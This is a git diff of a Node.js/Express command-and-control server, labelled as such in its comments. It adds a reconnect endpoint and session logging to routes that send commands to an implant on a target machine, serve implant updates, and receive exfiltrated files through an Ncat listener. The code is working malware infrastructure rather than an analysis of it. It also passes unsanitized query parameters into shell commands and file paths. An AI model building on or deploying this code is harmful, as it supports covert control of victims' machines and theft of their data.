@@ -25,6 +25,15 @@ app.get('/', (req, res) => {
 	res.send(`${sid}`);
 });
 
+app.get('/reconnect', (req, res) => {
+		var sid = req.query.sid;
+		console.log(`${sid} has reconnected.`);
+		fs.appendFile(`Sessions/${sid}/${sid}.log`, "Connection has been reestablished\n", err => {
+				if (err) console.error(err)
+		})
+		res.send(`Welcome Back`);
+});
+
 //Used to return the output from the target machine to our C2 server
 app.get('/info', (req, res) => {
     if(req.query.info != null){
@@ -41,10 +50,16 @@ app.get('/info', (req, res) => {
 //Used to send out command to the server to be read by the implant
 app.get('/retrcommand', (req, res) => {
     res.send(command)
+		console.log(`${sid} has been sent ${command}.`);
 });
 
 app.get('/updateImplant', (req, res) => {
+		var sid = req.query.sid;
     res.download('Implant/implant.py')
+		console.log(`${sid} has updated their implant.`);
+		fs.appendFile(`Sessions/${sid}/${sid}.log`, `${sid} had downloaded a new implant.\n`, err => {
+				if (err) console.error(err)
+		})
 });
 
 app.get('/exfil', (req, res) => {
@@ -54,7 +69,7 @@ app.get('/exfil', (req, res) => {
 		await exec(`Ncat -lp 1234 > Sessions/${sid}/${fileName}`, (err, stdout, stderr) => {
     		if (err) console.error(err)
     		if (stderr) console.error(stderr)
-    		console.log(`${sid} has transferred a file.`);
+    		console.log(`${sid} has transferred file: ${fileName}.`);
 		});
 	}
 	OpenExfilPort()
